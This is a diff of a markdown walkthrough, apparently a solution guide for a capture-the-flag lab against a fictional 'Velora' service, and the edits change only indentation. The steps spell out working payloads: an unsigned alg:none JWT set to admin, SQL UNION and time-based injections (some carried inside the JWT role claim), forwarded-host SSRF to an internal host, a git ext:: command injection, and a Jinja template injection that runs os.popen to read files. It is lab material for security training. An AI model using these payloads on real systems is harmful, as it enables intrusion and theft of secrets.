@@ -19,9 +19,11 @@ Each `/x/<id>` gate consumes the accumulated `X-Chain` proof and returns the nex
 4. **L7 — Console authorization:** `/docs`/the session behavior shows the JWT is accepted without a signature check. Decode and preserve its existing claims, set `role=admin`, and use an `alg:none` header. The operator cookie and current chain proofs are also required.
 5. **L8 — Legacy export:** The console-enabled path `/api/v1/export/1001` returns the partner PDF used by this gate.
 6. **L9 — Catalog route discovery:** The catalog endpoint accepts a seven-column UNION-shaped query. Use:
+
    ```sql
    ' UNION SELECT id,name,detail,NULL,NULL,NULL,NULL FROM fabric_routes--
    ```
+
    The returned route map identifies the internal Fabric service and available ports.
 7. **L10 — Internal host:** The route map and preview response identify `fabric.velora.internal`. Request it through `/api/preview` with `X-Forwarded-Host: fabric.velora.internal`, then visit the L10 entry with that header.
 8. **L11 — Repeat preview:** Repeat the internal preview pre-step before visiting L11. The solver currently sends the forwarded-host header on this preview too; do not claim this run independently proves the header persisted from L10.
@@ -41,10 +43,12 @@ Each `/x/<id>` gate consumes the accumulated `X-Chain` proof and returns the nex
 22. **L26 — Reconcile secret:** Use the accepted upload payload with `cat /opt/velora/reconcile.env`; extract the per-instance `RECON_PASS`.
 23. **L27 — Job script:** POST `/import` with `repo_url=ext::sh -c cat${IFS}/opt/velora/nightly.sh>&2`. The response provides the scheduled job/reconciliation behavior.
 24. **L28 — Release note and navigator query:** The demo form renders its `name` field. Submit:
-   ```jinja
-   {{ cycler.__init__.__globals__.os.popen('cat /root/velora/release.note').read() }}
-   ```
-   The returned note provides the navigator query shape: `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort`.
+
+    ```jinja
+    {{ cycler.__init__.__globals__.os.popen('cat /root/velora/release.note').read() }}
+    ```
+
+    The returned note provides the navigator query shape: `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort`.
 25. **L29 — Reconcile:** The job script and extracted credentials identify `/ledger/reconcile`. Request it through `/api/preview` using basic auth in the URL; the response reports `RC-8841` and `config updated`.
 26. **L30 — Record delay:** The L28 query shape explains how the gate consumes the JWT role. Forge `alg:none` with role `x' UNION SELECT '/delay',sleep(3) #`; visit L30. The gate returns `Delay recorded.`; no actual three-second delay was observed.
 27. **L31 — Read settlement record:** Reuse the unsigned JWT carrier with role `x' UNION SELECT value,value FROM config WHERE name='settlement_record' #`. Visit L31 to retrieve the settlement value and flag.
